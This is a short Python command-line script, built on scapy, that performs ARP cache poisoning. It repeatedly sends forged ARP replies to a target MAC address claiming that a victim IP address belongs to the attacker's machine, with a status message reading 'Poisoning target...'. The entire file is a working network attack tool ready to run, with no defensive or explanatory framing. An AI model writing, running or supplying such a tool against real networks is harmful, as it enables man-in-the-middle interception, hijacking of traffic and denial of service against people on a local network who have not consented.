import rich
import typer
from scapy.arch import get_if_hwaddr
from scapy.config import conf
from scapy.layers.l2 import Ether, ARP
from scapy.all import sendp


class ARPPoisoner:

    def __init__(self, target_MAC: str, victim_IP: str):
        self.target_MAC = target_MAC
        self.victim_IP = victim_IP

    def run(self):
        packets = [Ether(src=get_if_hwaddr(conf.iface), dst=self.target_MAC) / ARP(op='is-at', psrc=self.victim_IP,
                                                                                   hwsrc=get_if_hwaddr(conf.iface))]
        sendp(packets, loop=1, verbose=False, inter=0.5)


def main(target_mac: str, victim_ip: str):
    console = rich.console.Console()
    with console.status('Poisoning target...'):
        ARPPoisoner(target_MAC=target_mac, victim_IP=victim_ip).run()


if __name__ == '__main__':
    typer.run(main)
